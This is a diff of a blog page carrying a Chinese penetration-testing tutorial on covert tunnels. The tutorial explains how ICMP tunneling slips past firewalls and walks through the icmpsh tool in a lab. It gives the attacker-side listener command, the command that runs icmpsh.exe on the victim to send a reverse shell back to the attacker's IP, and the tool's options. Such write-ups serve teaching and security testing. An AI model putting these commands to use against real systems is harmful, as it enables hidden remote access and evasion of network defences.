@@ -164,33 +164,170 @@
 </script>
             <div class="main">
                 <div class="container">
-                    <div class="post-wrap archive">
-                        
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                内网渗透:隐藏通讯隧道技术
+                            </h1>
                             
-                                <h3>
-                                    2020
-                                </h3>
+                                    <!--zh-->
+                                    <div class="post-meta zh">
+                                        &#x4F5C;&#x8005;:
+                                        <a itemprop="author" rel="author" href="/">
+                                            m0sway
+                                        </a>
+                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2020-08-03</a></span>
+                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
+                                    href="#">3.9
+                                    &#x5206;&#x949F;</a></span>
+                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">1060</a></span>
+                                        
+                                                阅读量:
+                                                <span data-hk-page="current"> - </span>
+                                                
+                                    </div>
+                                    
+                        </header>
+                        
+                        <div class="post-content">
+                            <h2 id="隧道">隧道？</h2>
+<p>在实际的网络中，通常会通过各种边界设备、软/硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。</p>
+<p>常用的隧道技术有以下三种：</p>
+<ul>
+<li>网络层：IPv6 隧道、ICMP 隧道</li>
+<li>传输层：TCP 隧道、UDP 隧道、常规端口转发</li>
+<li>应用层：SSH 隧道、HTTP/S 隧道、DNS 隧道</li>
+</ul>
+<h2 id="icmp-隧道">ICMP 隧道</h2>
+<p>ICMP（Internet ControlMessages Protocol，网间控制报文协议）是TCP/IP协议族的子协议，是一种面向无连接的协议。</p>
+<p>在 ICMP 通信协议中，通信双方的两台设备不需要开放端口即可进行，而在一般的通信协议中，是必须要开放端口的。最常见的 ICMP 协议的消息为 ping 命令的回复，攻击者可以利用命令行得到比回复更多的 ICMP 请求。</p>
+<p>在一些网络环境中，如果攻击者使用各类上层隧道（例如HTTP隧道、DNS隧道、常规端口转发等）进行的操作都失败了，由于防火墙不会屏蔽ping数据包，所以常常会通过ping命令访问远程主机，尝试建立ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙，实现不受限制的网络访问。</p>
+<p>经常使用的ping命令就是基于ICMP协议，windows系统下ping默认传输的是： abcdefghijklmnopqrstuvwabcdefghi，共32bytes，如下图所示：<br>
+<img src="https://m0sway.github.io/post-images/1596435955491.jpg" alt="" loading="lazy"></p>
+<p>linux系统下，ping默认传输的是48bytes，前8bytes随时间变化，后面的固定不变，内容为!”#$%&amp;’()+,-./01234567，如下图所示：<br>
+<img src="https://m0sway.github.io/post-images/1596435987171.jpg" alt="" loading="lazy"></p>
+<p>此外，ping的包大小，也就是data大小是可以修改的，从包体内容来看，规律还是一样，就是重复罢了，如下图所示：分别是win和linux<br>
+<img src="https://m0sway.github.io/post-images/1596436036345.jpg" alt="" loading="lazy"><br>
+<img src="https://m0sway.github.io/post-images/1596436043909.jpg" alt="" loading="lazy"></p>
+<p>那么问题来了：是否可以改变这些data填充我们自己的数据呢？<br>
+答案是可以的，这就是ICMP隐蔽隧道的原理，改变操作系统默认填充的Data，替换成我们自己的数据。</p>
+<p>icmpsh<br>
+icmpsh 工具是一个简单的ICMP反弹shell工具。可以跨平台，且运行时无需管理员权限。</p>
+<p>下载地址：https://github.com/inquisb/icmpsh</p>
+<p>运行需要安装Python的impacket类库，以便对tcp、udp、icmp、igmp、arp、ipv4、ipv6、smb、等进行访问。</p>
+<p>icmpsh 运行时因为要代替系统本身的ping命令的应答程序，所以需要先执行以下命令关闭本地系统的ICMP应答，否则获得的shell不稳定：<br>
+<code>sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1 // 恢复设为0</code><br>
+<img src="https://m0sway.github.io/post-images/1596436339770.jpg" alt="" loading="lazy"></p>
+<h3 id="演示">演示</h3>
+<p>攻击者IP：192.168.200.103<br>
+受害者IP：192.168.200.110</p>
+<p>攻击者server端在项目目录下输入：</p>
+<pre><code>    python icmpsh_m.py 192.168.200.103 192.168.200.110
+    python icmpsh_m.py 攻击者ip 受害者ip
+</code></pre>
+<p>或输入./run.sh运行程序，之后提醒你输入受害者公网ip，会给出你在受害者主机上执行的命令。</p>
+<p>给受害者主机上传icmpsh.exe并执行命令：</p>
+<pre><code>    icmpsh.exe -t 192.168.200.103 -d 500 -b 30 -s 128
+</code></pre>
+<p>即可在攻击机上看到受害者的shell：</p>
+<pre><code>imcpsh.exe参数：
+    -t  host主机ip地址，用于向其发送ping请求。 此选项是强制性的！
+    -r  发送包含字符串的单个测试icmp请求，然后退出。这是用于测试连接的。
+    -d  毫秒请求之间的延迟（以毫秒为单位）
+    -o  毫秒响应超时（以毫秒为单位）。 如果未及时收到回复，
+                        从站将增加一个空白计数器。 如果该计数器达到极限，则从站将退出。
+                        如果收到响应，则计数器设置回0。
+    -b  空格数限制（退出前未答复的icmp请求
+    -s  字节最大数据缓冲区大小（以字节为单位）
+</code></pre>
+
+                        </div>
+                        
                                 
                                     
+                                            <!--zh-->
+                                            <section class="post-copyright zh">
+                                                <p class="copyright-item ">
+                                                    <span>&#x4F5C;&#x8005;:</span>
+                                                    <span>m0sway</span>
+                                                </p>
 
-                                        <article class="archive-item">
-                                            <a class="archive-item-link" href="https://m0sway.github.io/post/fan-dan-shell-zong-jie/">
-                                                反弹shell总结
-                                            </a>
-                                            <span class="archive-item-date">2020-07-31 </span>
-                                        </article>
-                                        
+                                                <p class="copyright-item">
+                                                    <span>&#x6C38;&#x4E45;&#x94FE;&#x63A5;:</span>
+                                                    <span><a href="https://m0sway.github.io/post/nei-wang-shen-tou-yin-cang-tong-xun-sui-dao-ji-zhu/">https://m0sway.github.io/post/nei-wang-shen-tou-yin-cang-tong-xun-sui-dao-ji-zhu/</a></span>
+                                                </p>
+
+                                                <p class="copyright-item">
+                                                    <span>&#x534F;&#x8BAE;:</span>
+                                                    <span>MIT License</span>
+                                                </p>
+                                            </section>
                                             
                                                 
-                    </div>
-                    <div class="pagination-container">
+                                                    
+                                                                    <!--Share-->
+                                                                    <span style="margin-right:15px">
+                        <i class="post-share"></i>
+                        <span>&#x5206;&#x4EAB;:</span>
+                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://m0sway.github.io/post/nei-wang-shen-tou-yin-cang-tong-xun-sui-dao-ji-zhu/"><i class="fa fa-qrcode"></i></a>
+                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://m0sway.github.io/post/nei-wang-shen-tou-yin-cang-tong-xun-sui-dao-ji-zhu/&sharesource=qzone&title=内网渗透:隐藏通讯隧道技术&pics=https://m0sway.github.io/images/avatar.png?v=1599121203892&summary="><i class="fa fa-qq"></i></a>
+                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://m0sway.github.io/post/nei-wang-shen-tou-yin-cang-tong-xun-sui-dao-ji-zhu/&sharesource=weibo&title=内网渗透:隐藏通讯隧道技术 + " - " + &pic="https://m0sway.github.io/images/avatar.png?v=1599121203892 "><i class="fa fa-weibo "></i></a>
+
+                                                                    </span>
+                                                                    
+                                                                            <!--zh-->
+                                                                            <section class="post-tags zh ">
+                                                                                <div>
+                                                                                    <span>&#x6807;&#x7B7E;:</span>
+                                                                                    <span class="tag ">
                         
-                            
-                                    
-                                            
-                    </div>
+                                </span>
+                                                                                </div>
+                                                                                <div>
+                                                                                    <a href="javascript:window.history.back();">
+                        &#x8FD4;&#x56DE;</a>
+                                                                                    <span>&dot;</span>
+                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
+                                                                                </div>
+                                                                            </section>
+
+                                                                            
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://m0sway.github.io/post/windows-xi-tong-xin-xi-shou-ji/">
+                                                                                            Windows 系统信息收集
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://m0sway.github.io/post/fan-dan-shell-zong-jie/">
+                                                                                                    反弹shell总结
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
                 </div>
+                
+                                            
+                                                <script type="application/javascript" src="//unpkg.com/valine@latest/dist/Valine.min.js"></script>
+<div id="vlaine-comment"></div>
+<script type="application/javascript">
+    new Valine({
+        el: '#vlaine-comment',
+        appId: 'uW9floiITitWlppTUG210Vco-gzGzoHsz',
+        appKey: 'QOQ63bDmWvNAx6F04cpXfCW0',
+        pageSize: 10,
+        avatar: 'mp',
+        placeholder: '嘿嘿嘿！！！',
+        visitor: true,
+        highlight: true,
+        recordIP: true,
+    })
+</script>
+                                                    
             </div>
+    </div>
+    </div>
     </div>
     
     <div id="player"></div>
@@ -321,5 +458,8 @@
                     
         </div>
 </body>
+<script>
+    scroll();
+</script>
 
 </html>
